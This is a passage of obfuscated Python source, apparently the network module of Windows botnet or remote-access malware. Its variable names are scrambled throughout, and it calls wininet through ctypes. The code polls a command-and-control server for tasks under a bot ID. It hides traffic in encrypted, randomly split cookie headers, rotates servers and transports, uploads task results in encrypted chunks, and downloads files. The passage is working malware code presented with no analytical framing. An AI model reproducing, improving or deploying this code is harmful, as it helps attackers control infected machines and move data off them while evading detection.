		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi.append('--'+self.boundary+'--')
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi.append('')
		return '\r\n'.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezDi)


class HttpKlass(object):

	def __init__(self,url,user_agent):
		self.url=url
		self.user_agent=user_agent
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi=urlparse_urlparse(self.url)
		self.hostname=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.hostname
		self.path=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.path
		self.port=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.port
		self.flags=INTERNET_FLAG_NO_CACHE_WRITE|pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzQDey|pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyiQe
		if not self.port:
			self.port=443 if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.scheme=='https' else 80
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.scheme=='https':
			self.flags|=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQeD


	@staticmethod
	def __inet_read(handle):
		ctype_wininet=ctypes.windll.wininet
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz=65535
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD=ctypes.create_string_buffer(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz=ctypes.c_ulong()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=b''
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDi=True
		while pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDi:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDi=False
			ctype_wininet.InternetReadFile(handle,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz,ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz))
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz.value>0:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie+=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD.raw[:pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz.value]
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDi=True
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	@staticmethod
	def __query_content_encoding(handle):
		ctype_wininet=ctypes.windll.wininet
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz=8192
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz=ctypes.c_ulong(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD=ctypes.create_string_buffer(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiz)
		ctype_wininet.HttpQueryInfoA(handle,29,ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD),ctypes.byref(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyDz),None)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyiD.value


	def send_request(self,encoded_cookie_data,referer):
		ctype_wininet=ctypes.windll.wininet
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy=''
		if encoded_cookie_data:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Cookie: {0}\r\n'.format(encoded_cookie_data)
		if referer:
			pass
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy=unicode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=b''
		hInternet=ctype_wininet.InternetOpenW(unicode(self.user_agent),INTERNET_OPEN_TYPE_PRECONFIG,None,None,0)
		hConnect=ctype_wininet.InternetConnectW(hInternet,self.hostname,self.port,None,None,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQei,0,1)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz=ctype_wininet.HttpOpenRequestW(hConnect,u'GET',self.path,u'HTTP/1.1',None,None,self.flags,0)
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy=ctype_wininet.HttpSendRequestW(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy,len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy),None,0)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__inet_read(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy=self.__query_content_encoding(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzy)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy:
				ctype_wininet.InternetCloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy)
		finally:
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz:
				ctype_wininet.InternetCloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
			if hConnect:
				ctype_wininet.InternetCloseHandle(hConnect)
			if hInternet:
				ctype_wininet.InternetCloseHandle(hInternet)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	def post_form(self,encoded_cookie_data,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi):
		ctype_wininet=ctypes.windll.wininet
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei=str(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy='Accept-Encoding: identity\r\n'
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Cookie: {0}\r\n'.format(encoded_cookie_data)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Content-type: {0}\r\n'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDzi.get_content_type())
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Content-length: {0}\r\n'.format(len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy+='Connection: close\r\n'
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy=unicode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=b''
		hInternet=ctype_wininet.InternetOpenW(unicode(self.user_agent),INTERNET_OPEN_TYPE_PRECONFIG,None,None,0)
		hConnect=ctype_wininet.InternetConnectW(hInternet,self.hostname,self.port,None,None,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzyQei,0,1)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz=ctype_wininet.HttpOpenRequestW(hConnect,u'POST',self.path,u'HTTP/1.1',None,None,self.flags,0)
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy=ctype_wininet.HttpSendRequestW(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy,len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeizy),pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei,len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQyDei))
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__inet_read(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy:
				ctype_wininet.InternetCloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDy)
		finally:
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz:
				ctype_wininet.InternetCloseHandle(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeiDz)
			if hConnect:
				ctype_wininet.InternetCloseHandle(hConnect)
			if hInternet:
				ctype_wininet.InternetCloseHandle(hInternet)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


class ExceptionKlass(Exception):
	pass


class HttpParserKlass(HTMLParser):

	def __init__(self):
		self.reset()
		self.fed=[]
		self.links=[]


	def handle_data(self,d):
		self.fed.append(d.strip())


	def handle_starttag(self,tag,attrs):
		if tag=='a':
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ in attrs:
				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD=='href':
					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ and pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ[0]=='h':
						self.links.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ)


	def handle_starttag(self,tag,attrs):
		if tag=='a':
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ in attrs:
				if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQezyD=='href':
					self.links.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziDyQ)

	def get_data(self):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=''.join(self.fed)
		self.fed=[]
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	def get_links(self):
		return self.links


class NetworkHandlerKlass(object):

	def __init__(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		self.__url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('url',None)
		self.user_agent=botKlass.user_agent


	@staticmethod
	def random_split_args(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)<5:
			return[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyz=len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)/random_randint(2,7)
		i=0
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD=[]
		while i<len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
			k=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyz+random_randint(1,5)
			if k<4:
				k=4
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy[i:i+k]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz=len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz>3:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy=random_randint(min(2,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz),min(6,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiz-1))
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[:pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy]+'='+pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDiy:]
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD.append(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeDyi)
			i+=k
		if len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD[-1])<4:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD[-2]+=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD[-1]
			del pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD[-1]
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQzyeD


	@staticmethod
	def __encode_cookie(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye=json_dumps(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye=CryptoKlass.tr_encrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye,botKlass.broker_key)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye=base64_b64encode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye,'-_').replace('=','')
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye=NetworkHandlerKlass.random_split_args(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye)
		return "; ".join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizye)


	@property
	def url(self):
		return self.__url if self.__url else botKlass.current_host


	@property
	def referer(self):
		if botKlass.is_first_request:
			referer=botKlass.referer
		else:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi=urlparse_urlparse(self.url)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD=''
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.port:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD=':{0}'.format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD)
			referer="{0}://{1}{2}/".format(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.scheme,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQeyzi.netloc,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizyD)
		return referer if referer else False


	def decode_data(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizey=HttpParserKlass()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizey.feed(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizey.get_data()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizeD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizey.get_links()
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=''.join(botKlass.decode_data_pattern.findall(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=base64_b64decode(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy.ljust(len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)+len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)%4,'='),'-_')
		try:
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe=CryptoKlass.tr_decrypt(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,botKlass.broker_key)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=json_loads(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDe)
		except:
			for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDe in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizeD:
				try:
					self.__send_request(url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDe)
				except Exception as exp:
					pass
			botKlass.set_broker_key(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
			raise ExceptionKlass
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy


	def __send_request(self,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		url=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.pop('url',self.url)
		encoded_cookie_data=None
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=None
		if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ:
			encoded_cookie_data=self.__encode_cookie(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ)
		if botKlass.current_transport=='wininet':
			pass
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze=HttpKlass(url,self.user_agent)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze.send_request(encoded_cookie_data,self.referer)
		else:
			pass
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD=urllib2_build_opener()
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.addheaders=[('User-agent',self.user_agent)]
			if encoded_cookie_data:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.addheaders.append(('Cookie',encoded_cookie_data))
			if self.referer:
				pass
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyzD.open(url)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez.read()
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyez.info().get('Content-Encoding')
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyeD)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy


	def __chunks(self,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,size):
		return[pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy[i:i+size]for i in range(0,len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy),size)]


	def get_tasks(self):
		networkTasks=[]
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy=CryptoKlass(botKlass.get_key('aes'),botKlass.get_key('aes_iv'))
		for h in range(botKlass.total_hosts):
			for t in range(botKlass.total_transports):
				for pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyDe in range(3):
					networkTasks=[]
					try:
						response_data=self.__send_request(id=botKlass.bot_id)
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=self.decode_data(response_data)
						if not 'tasks' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
							return[]
						pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy['tasks']
						for networkTask in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD:
							if 'task_data' in networkTask and networkTask['task_data']:
								networkTask['task_data']=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy.decode_data(networkTask['task_data'])
								networkTasks.append(networkTask)
						botKlass.is_first_request=False
						return networkTasks
					except ExceptionKlass:
						pass
						time_sleep(random_randint(3,8))
						continue
					except(urllib2_httperror,ValueError,TypeError)as error:
						time_sleep(3)
						pass
					except urllib2_urlerror as error:
						pass
						time_sleep(5)
					except Exception as e:
						pass
						time_sleep(10)
				botKlass.change_transport()
			botKlass.change_host()
		return networkTasks


	def send_task(self,taskID,taskData):
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=False
		max_cuont=10
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy=CryptoKlass(botKlass.get_key('aes'),botKlass.get_key('aes_iv'))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy.encode_data(taskData)
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDz=self.__chunks(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeyiD,random_randint(600,850))
		pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDy=len(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDz)
		for i in range(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDy):
			for count in range(max_cuont+1):
				if count==max_cuont:
					return False
				try:
					time_sleep(random_randint(1,3))
					pass
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.__send_request(id=botKlass.bot_id,action='answer',task_id=taskID,data=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDz[i],current=i,total=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQieDy)
					pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie=self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie)
					if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie.get('result','')=='ok':
						botKlass.is_first_request=False
						break
				except ExceptionKlass:
					pass
					time_sleep(random_randint(3,8))
					continue
				except(urllib2_httperror,ValueError)as err:
					pass
					time_sleep(3)
		return pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDyie


	def download_file(self,url_file_name,**pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ):
		for i in range(3):
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzDeiQ.get('checksum',None)
			pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy=self.__send_request(id=botKlass.bot_id,action='download',file=url_file_name)
			if pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy:
				pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDze=binascii_crc32(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)&0xffffff
				if not pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDze==int(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiDzy):
					try:
						self.decode_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy)
					except ExceptionKlass:
						time_sleep(random_randint(3,8))
						continue
					raise ValueError
